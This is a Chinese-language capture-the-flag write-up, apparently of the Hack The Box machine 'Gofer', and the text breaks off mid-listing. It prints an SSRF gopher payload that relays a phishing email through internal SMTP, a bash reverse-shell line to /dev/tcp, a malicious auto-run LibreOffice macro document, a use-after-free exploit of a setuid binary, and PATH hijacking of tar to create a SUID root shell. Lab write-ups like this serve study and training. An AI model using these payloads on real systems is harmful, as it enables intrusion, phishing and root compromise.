<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl proxy.gofer.htb/index.php?url=file:///etc/passwd -X POST<br>&lt;!-- Welcome to Gofer proxy --&gt;<br>&lt;html&gt;&lt;body&gt;Blacklisted keyword: file:// !&lt;/body&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>想试试LFI的，可惜明显过滤了file协议，其他常用的协议还有<code>gofer</code>、<code>dict</code>以及<code>http</code>等。突然发现了华点，这台机子不就叫<code>gofer</code>吗，暗示我们该用<code>gofer</code>协议？gofer协议主要用于发送GET以及POST请求以及攻击内网应用。</p>
<p>我们有攻击内网应用的需求吗？被filter的25端口smtp呗。显然smtp只能在内网使用，刚好我们可以通过ssrf伪造成服务器在内部发邮件。回忆之前的邮件内容，是时候再钓一钓喜欢乱点链接的Jocelyn的鱼咯。</p>
<h4 id="钓鱼邮件构造"><a href="#钓鱼邮件构造" class="headerlink" title="钓鱼邮件构造"></a>钓鱼邮件构造</h4><p>我们直接搜索ssrf smtp gofer就会出来一堆利用教程，附一点相关资料：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher">hacktricks</a>、<a target="_blank" rel="noopener" href="https://github.com/rhamaa/Web-Application-Attack/blob/master/other-vulnerability/service-side-request-forgery/ssrf-and-smtp.md">github</a>。或者我们可以使用<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a>这个工具生成pyload。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gopherus --exploit smtp<br><br><br>  ________              .__<br> /  _____/  ____ ______ |  |__   ___________ __ __  ______<br>/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/<br>\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \<br> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;<br>        \/       |__|        \/     \/                 \/<br><br>                author: $_SpyD3r_$<br><br><br>Give Details to send mail:<br><br>Mail from :  jdavis@gofer.htb<br>Mail To :  jocelyn@gofer.htb<br>Subject :  Important!<br>Message :  &lt;a href=<span class="hljs-string">&quot;http://&lt;HTB_VPN_IP&gt;:19198/door.sh&quot;</span>&gt;<span class="hljs-built_in">read</span>&lt;/a&gt;<br><br>Your gopher <span class="hljs-built_in">link</span> is ready to send Mail:<br><br>gopher://127.0.0.1:25/_MAIL%20FROM:jdavis%40gofer.htb%0ARCPT%20To:jocelyn%40gofer.htb%0ADATA%0AFrom:jdavis%40gofer.htb%0ASubject:Important%21%0AMessage:%3Ca%20href%3D%22http://&lt;HTB_VPN_IP&gt;:19198/door.sh%22%3Eread%3C/a%3E%0A.<br></code></pre></td></tr></table></figure>

<p>直接用这个paylod你会发现<code>/127</code>也在黑名单里面，好在ssrf绕过里面好多对本地地址的绕过，我们可以使用10进制的地址<code>2130706433</code>，一样是代表<code>127.0.0.1</code>。</p>
<p>door.sh的内容其实就是反弹shell的命令:<code>/bin/bash -i &gt;&amp; /dev/tcp/&lt;HTB_VPN_IP&gt;/11451 0&gt;&amp;1</code></p>
<p>然后payload的内容要经过URL编码，不然没反应。</p>
<p>我们尝试一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl proxy.gofer.htb/index.php?url=gopher%3A%2F%2F2130706433%3A25%2F_MAIL%2520FROM%3Atest%2540test.htb%250ARCPT%2520To%3Ajocelyn%2540gofer.htb%250ADATA%250AFrom%3Ajdavis%2540gofer.htb%250ASubject%3AImportant%2521%250AMessage%3A%253Ca%2520href%253D%2522http%3A%2F%2F&lt;HTB_VPN_IP&gt;%3A19198%2Fdoor.sh%2522%253Eread%253C%2Fa%253E%250A. -X POST<br>&lt;!-- Welcome to Gofer proxy --&gt;<br>220 gofer.htb ESMTP Postfix (Debian/GNU)<br>250 2.1.0 Ok<br>550 5.1.1 &lt;jocelyn@gofer.htb&gt;: Recipient address rejected: User unknown <span class="hljs-keyword">in</span> <span class="hljs-built_in">local</span> recipient table<br>554 5.5.1 Error: no valid recipients<br>221 2.7.0 Error: I can <span class="hljs-built_in">break</span> rules, too. Goodbye.<br>1<br></code></pre></td></tr></table></figure>

<p>提示没有收件人，何意啊。。。她不就叫jocelyn吗。观察了一下开始那封邮件，发件人叫jdavis，我们去官网看看他是不是就叫这个。</p>
<p class='item-img' data-src='/pic/assets/image-20230805172809145.png'><img src="/pic/assets/image-20230805172809145.png" alt="image-20230805172809145"></p>
<p>草，原来是缩写。Tom Buckley的用户名确实也是tbuckley，所以Jocelyn Hudson的用户名应该叫jhudson。改完试试看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl proxy.gofer.htb/index.php?url=gopher%3A%2F%2F2130706433%3A25%2F_MAIL%2520FROM%3Ajdavis%2540gofer.htb%250ARCPT%2520To%3Ajhudson%2540gofer.htb%250ADATA%250AFrom%3Ajdavis%2540gofer.htb%250ASubject%3AImportant%2521%250AMessage%3A%253Ca%2520href%253D%2522http%3A%2F%2F&lt;HTB_VPN_IP&gt;%3A19198%2Fdoor.sh%2522%253Eread%253C%2Fa%253E%250A. -X POST<br></code></pre></td></tr></table></figure>

<p>我们在本地起一个http服务器并开一个nc端口监听，然后我们就会发现Jocelyn确实点了链接，然而却没能给我们反弹shell。可能做了限制，结合之前邮件，可能只有在邮件里传<code>.odt</code>文件他们才会打开。</p>
<h4 id="恶意odt文件构造"><a href="#恶意odt文件构造" class="headerlink" title="恶意odt文件构造"></a>恶意odt文件构造</h4><p>本来先尝试用<code>msf</code>的<code>exploit/multi/fileformat/libreoffice_macro_exec</code>构造的文件，可惜传上去怎么都不能成功拿到shell，我不知道是哪里出了问题。</p>
<p>再搜了搜看看，发现有文章详细介绍了如何<a target="_blank" rel="noopener" href="https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html">手动构造恶意odt文件</a>。</p>
<p>步骤：</p>
<ol>
<li><p>打开libreoffice，选择工具–&gt;宏–&gt;管理宏–&gt;使用Basic语言</p>
</li>
<li><p class='item-img' data-src='/pic/assets/21070dc8fff0a64ada2f04298e125ac9.png'><img src="/pic/assets/21070dc8fff0a64ada2f04298e125ac9.png" alt="21070dc8fff0a64ada2f04298e125ac9">按文章那样利用<code>Shell()</code>函数构造反弹shell，但是其实不用像文章那样分三步这么麻烦。还有要注意的是，外面一定要套一个<code>bash -c</code>，不然收不到shell，很搞。</p>
</li>
<li><p>宏写好后，要在自定义里面指定在文件打开时自动执行我们的宏。</p>
<p class='item-img' data-src='/pic/assets/994e84c936c6d7bae83728199a99e20b.png'><img src="/pic/assets/994e84c936c6d7bae83728199a99e20b.png" alt="994e84c936c6d7bae83728199a99e20b"></p>
</li>
<li><p>保存，ok力。</p>
</li>
</ol>
<h4 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -X POST proxy.gofer.htb/index.php?url=gopher%3A%2F%2F2130706433%3A25%2F_MAIL%2520FROM%3Ajdavis%2540gofer.htb%250ARCPT%2520To%3Ajhudson%2540gofer.htb%250ADATA%250AFrom%3Ajdavis%2540gofer.htb%250ASubject%3AImportant%250AMessage%3A%253Ca%2520href%253D%2522%2520http%3A%2F%2F&lt;HTB_VPN_IP&gt;%3A19198%2Fexp.odt%2520%2522%253Eread%253C%2Fa%253E%250A.<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python -m http.server 19198<br>Serving HTTP on 0.0.0.0 port 19198 (http://0.0.0.0:19198/) ...<br>10.10.11.225 - - [04/Aug/2023 13:28:50] <span class="hljs-string">&quot;GET /exp.odt HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nc -nlvp 11451<br>listening on [any] 11451 ...<br>connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.225] 34542<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (4974): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>bash: /home/jhudson/.bashrc: Permission denied<br>jhudson@gofer:/usr/bin$<br></code></pre></td></tr></table></figure>

<p>成功拿下，user flag在home目录下。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="pspy64获取信息"><a href="#pspy64获取信息" class="headerlink" title="pspy64获取信息"></a>pspy64获取信息</h3><p>sudo用不了。</p>
<p>查找s位程序倒是有发现。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">jhudson@gofer:/usr/bin$ find / -<span class="hljs-built_in">type</span> f -perm -04000 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 2&gt;/dev/null<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br>/usr/bin/fusermount<br>/usr/bin/mount<br>/usr/bin/passwd<br>/usr/bin/umount<br>/usr/bin/gpasswd<br>/usr/bin/chsh<br>/usr/bin/pkexec<br>/usr/bin/su<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/local/bin/notes<br>You have mail <span class="hljs-keyword">in</span> /var/mail/jhudson<br>jhudson@gofer:/usr/bin$ <span class="hljs-built_in">ls</span> -la /usr/local/bin/notes<br><span class="hljs-built_in">ls</span> -la /usr/local/bin/notes<br>-rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notes<br>jhudson@gofer:/usr/bin$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(jhudson) gid=1000(jhudson) <span class="hljs-built_in">groups</span>=1000(jhudson),108(netdev)<br></code></pre></td></tr></table></figure>

<p>然而jhudson并不是dev组的，研究不了这个notes，我们看看能不能想办法提权到dev组用户。</p>
<p>crontab也没有有意思的。</p>
<p>例行公事，pspy64和linpeas看一看。</p>
<p class='item-img' data-src='/pic/assets/c2a740168ab99dd253c3e22c888ea9ca.png'><img src="/pic/assets/c2a740168ab99dd253c3e22c888ea9ca.png" alt="c2a740168ab99dd253c3e22c888ea9ca"></p>
<p>等了一段时间，pspy64直接传回捷报，有一串tbuckley的登陆凭证，虽然不知道是不是，我们直接试试ssh登录看看，发现能成功登录，赢！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh tbuckley@10.10.11.225<br>tbuckley@10.10.11.225<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">Linux gofer.htb 5.10.0-23-amd64 #1 SMP Debian 5.10.179-2 (2023-07-14) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">You have no mail.</span><br><span class="hljs-string">tbuckley@gofer:~$ id</span><br><span class="hljs-string">uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)</span><br></code></pre></td></tr></table></figure>

<p>好巧不巧的是，tbuckley刚好是dev组的，那不撞枪口上了，直接研究一下notes。</p>
<h3 id="逆向notes"><a href="#逆向notes" class="headerlink" title="逆向notes"></a>逆向notes</h3><p>我们首先执行一下看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">tbuckley@gofer:/usr/local/bin$ <span class="hljs-built_in">ls</span> -la<br>total 28<br>drwxr-xr-x  2 root root  4096 Apr 28 16:06 .<br>drwxr-xr-x 10 root root  4096 Oct 28  2022 ..<br>-rwsr-s---  1 root dev  17168 Apr 28 16:06 notes<br>tbuckley@gofer:/usr/local/bin$ ./notes<br>========================================<br>1) Create an user and choose an username<br>2) Show user information<br>3) Delete an user<br>4) Write a note<br>5) Show a note<br>6) Save a note (not yet implemented)<br>7) Delete a note<br>8) Backup notes<br>9) Quit<br>========================================<br><br><br>Your choice:<br></code></pre></td></tr></table></figure>

<p>看起来像是一个写笔记的程序，测试了一下发现确实是差不多的。</p>
<p>那我们把程序丢进ida逆向下看看其大体流程。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs pseudocode">int __cdecl main(int argc, const char **argv, const char **envp)<br>&#123;<br>  char *v3; // rax<br>  int v5; // [rsp+Ch] [rbp-14h] BYREF<br>  void *ptr; // [rsp+10h] [rbp-10h]<br>  void *s; // [rsp+18h] [rbp-8h]<br><br>  v5 = 0;<br>  s = 0LL;<br>  ptr = 0LL;<br>  while ( 1 )<br>  &#123;<br>    puts(<br>      &quot;========================================\n&quot;<br>      &quot;1) Create an user and choose an username\n&quot;<br>      &quot;2) Show user information\n&quot;<br>      &quot;3) Delete an user\n&quot;<br>      &quot;4) Write a note\n&quot;<br>      &quot;5) Show a note\n&quot;<br>      &quot;6) Save a note (not yet implemented)\n&quot;<br>      &quot;7) Delete a note\n&quot;<br>      &quot;8) Backup notes\n&quot;<br>      &quot;9) Quit\n&quot;<br>      &quot;========================================\n&quot;<br>      &quot;\n&quot;);<br>    printf(&quot;Your choice: &quot;);<br>    __isoc99_scanf(&quot;%d&quot;, &amp;v5);<br>    puts(&amp;byte_212E);<br>    switch ( v5 )<br>    &#123;<br>      case 1:<br>        s = malloc(0x28uLL);<br>        if ( !s )<br>          exit(-1);<br>        memset(s, 0, 0x18uLL);<br>        memset((char *)s + 24, 0, 0x10uLL);<br>        if ( getuid() )<br>        &#123;<br>          *((_DWORD *)s + 6) = &#x27;resu&#x27;;<br>        &#125;<br>        else<br>        &#123;<br>          v3 = (char *)s + 24;<br>          *((_DWORD *)s + 6) = &#x27;imda&#x27;;<br>          v3[4] = &#x27;n&#x27;;<br>        &#125;<br>        printf(&quot;Choose an username: &quot;);<br>        __isoc99_scanf(&quot;%23s&quot;, s);<br>        puts(&amp;byte_212E);<br>        continue;<br>      case 2:<br>        if ( !s )<br>          goto LABEL_11;<br>        printf(&quot;\nUsername: %s\n&quot;, (const char *)s);<br>        printf(&quot;Role: %s\n\n&quot;, (const char *)s + 24);<br>        break;<br>      case 3:<br>        if ( s )<br>          free(s);<br>        continue;<br>      case 4:<br>        ptr = malloc(0x28uLL);<br>        memset(ptr, 0, 0x28uLL);<br>        if ( !ptr )<br>          exit(-1);<br>        puts(&quot;Write your note:&quot;);<br>        __isoc99_scanf(&quot;%39s&quot;, ptr);<br>        continue;<br>      case 5:<br>        printf(&quot;Note: %s\n\n&quot;, (const char *)ptr);<br>        continue;<br>      case 6:<br>        puts(&quot;Coming soon!\n&quot;);<br>        continue;<br>      case 7:<br>        if ( ptr )<br>        &#123;<br>          free(ptr);<br>          ptr = 0LL;<br>        &#125;<br>        continue;<br>      case 8:<br>        if ( s )<br>        &#123;<br>          if ( !strcmp((const char *)s + 24, &quot;admin&quot;) )<br>          &#123;<br>            puts(&quot;Access granted!&quot;);<br>            setuid(0);<br>            setgid(0);<br>            system(&quot;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes&quot;);<br>          &#125;<br>          else<br>          &#123;<br>            puts(&quot;Access denied: you don&#x27;t have the admin role!\n&quot;);<br>          &#125;<br>        &#125;<br>        else<br>        &#123;<br>LABEL_11:<br>          puts(&quot;First create an user!\n&quot;);<br>        &#125;<br>        break;<br>      default:<br>        exit(0);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们首先可以看到case 8里面有用root权限执行一条命令，那我们馋哭了，多么希望能绕过前面的用户身份验证。</p>
<p>再仔细分析一下，我们会发现case3删除用户处，只释放了空间，并没有将指针赋零，如果我们仔细看case7删除笔记功能就会发现，正确的流程是free之后要将指针赋零，不然会导致问题。我们听听<del>麦克阿瑟</del>chatgpt怎么说：</p>
<p class='item-img' data-src='/pic/assets/461de25446473fab19558ef19abe00c6.png'><img src="/pic/assets/461de25446473fab19558ef19abe00c6.png" alt="461de25446473fab19558ef19abe00c6"></p>
<p>很明显，这样会存在野指针的问题。我们该如何利用呢？</p>
<p>我们看到case1创建用户时开辟的空间是0x28的40字节的空间s，case8检查用户身份的时候，检测的是s的第24位开始是否是admin。case 4分配同样分配的是40字节的空间，因为指针没置0所以很可能分到刚才的地址s。</p>
<p>结合以上的分析，我们可以这样利用：</p>
<p>1.创建任意用户–&gt;2.删除用户，造成野指针–&gt;3.写笔记，前24位用户名随便填写，然后填上admin作为用户身份–&gt;4.运行8，此时可以通过用户身份验证。</p>
<p>然后接下来<code>tar -czvf /root/backups/backup_notes.tar.gz /opt/notes</code>这一条就好弄了，<code>tar</code>没用绝对地址，用的相对地址，那我们在<code>PATH</code>里面加上我们构造的tar就完事了，然后执行8就会以root权限执行我们的命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">tbuckley@gofer:/usr/local/bin$ ./notes<br>========================================<br>1) Create an user and choose an username<br>2) Show user information<br>3) Delete an user<br>4) Write a note<br>5) Show a note<br>6) Save a note (not yet implemented)<br>7) Delete a note<br>8) Backup notes<br>9) Quit<br>========================================<br><br><br>Your choice: 1<br><br>Choose an username: whatever<br><br>========================================<br>1) Create an user and choose an username<br>2) Show user information<br>3) Delete an user<br>4) Write a note<br>5) Show a note<br>6) Save a note (not yet implemented)<br>7) Delete a note<br>8) Backup notes<br>9) Quit<br>========================================<br><br><br>Your choice: 3<br><br>========================================<br>1) Create an user and choose an username<br>2) Show user information<br>3) Delete an user<br>4) Write a note<br>5) Show a note<br>6) Save a note (not yet implemented)<br>7) Delete a note<br>8) Backup notes<br>9) Quit<br>========================================<br><br><br>Your choice: 4<br><br>Write your note:<br>xxxxxxxxxxxxxxxxxxxxxxxxadmin<br>========================================<br>1) Create an user and choose an username<br>2) Show user information<br>3) Delete an user<br>4) Write a note<br>5) Show a note<br>6) Save a note (not yet implemented)<br>7) Delete a note<br>8) Backup notes<br>9) Quit<br>========================================<br><br><br>Your choice: 2<br><br><br>Username: xxxxxxxxxxxxxxxxxxxxxxxxadmin<br>Role: admin<br><br></code></pre></td></tr></table></figure>

<p>正如我们所想，完美。</p>
<p>再构造一下tar。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">tbuckley@gofer:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span> &gt; tar<br>tbuckley@gofer:/tmp$ <span class="hljs-built_in">chmod</span> +x tar<br>tbuckley@gofer:/tmp$ <span class="hljs-built_in">ls</span> -la<br>total 60<br>drwxrwxrwt 14 root     root     4096 Aug  5 15:49 .<br>drwxr-xr-x 18 root     root     4096 Jul 19 12:44 ..<br>drwxrwxrwt  2 root     root     4096 Aug  5 08:05 .font-unix<br>drwxr-xr-x  2 jhudson  jhudson  4096 Aug  5 14:36 hsperfdata_jhudson<br>drwxrwxrwt  2 root     root     4096 Aug  5 08:05 .ICE-unix<br>drwx------  3 jhudson  jhudson  4096 Aug  5 11:02 lu5012xuigb9.tmp<br>drwx------  2 jhudson  jhudson  4096 Aug  5 14:36 lu9624y25uma.tmp<br>srwxr-xr-x  1 jhudson  jhudson     0 Aug  5 14:36 OSL_PIPE_1000_SingleOfficeIPC_b31bb423faa33322afe433cf9acd1272<br>drwx------  3 root     root     4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-apache2.service-1K3kih<br>drwx------  3 root     root     4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-systemd-logind.service-FsKf3f<br>drwx------  3 root     root     4096 Aug  5 08:05 systemd-private-711ebd4724b24c22b4a90210e66cc476-systemd-timesyncd.service-0MAATi<br>-rwxr-xr-x  1 tbuckley tbuckley   52 Aug  5 15:49 tar<br>drwxrwxrwt  2 root     root     4096 Aug  5 08:05 .Test-unix<br>drwx------  2 root     root     4096 Aug  5 08:05 vmware-root_617-4022243191<br>drwxrwxrwt  2 root     root     4096 Aug  5 08:05 .X11-unix<br>drwxrwxrwt  2 root     root     4096 Aug  5 08:05 .XIM-unix<br></code></pre></td></tr></table></figure>

<p>再设置一下PATH，在重新执行一下notes</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">========================================<br>1) Create an user and choose an username<br>2) Show user information<br>3) Delete an user<br>4) Write a note<br>5) Show a note<br>6) Save a note (not yet implemented)<br>7) Delete a note<br>8) Backup notes<br>9) Quit<br>========================================<br><br><br>Your choice: 8<br><br>Access granted!<br></code></pre></td></tr></table></figure>

<p>查看一下tmp目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">tbuckley@gofer:/tmp$ <span class="hljs-built_in">ls</span> -la<br>total 1268<br>drwxrwxrwt 14 root     root        4096 Aug  5 15:51 .<br>drwxr-xr-x 18 root     root        4096 Jul 19 12:44 ..<br>drwxrwxrwt  2 root     root        4096 Aug  5 08:05 .font-unix<br>drwxr-xr-x  2 jhudson  jhudson     4096 Aug  5 14:36 hsperfdata_jhudson<br>drwxrwxrwt  2 root     root        4096 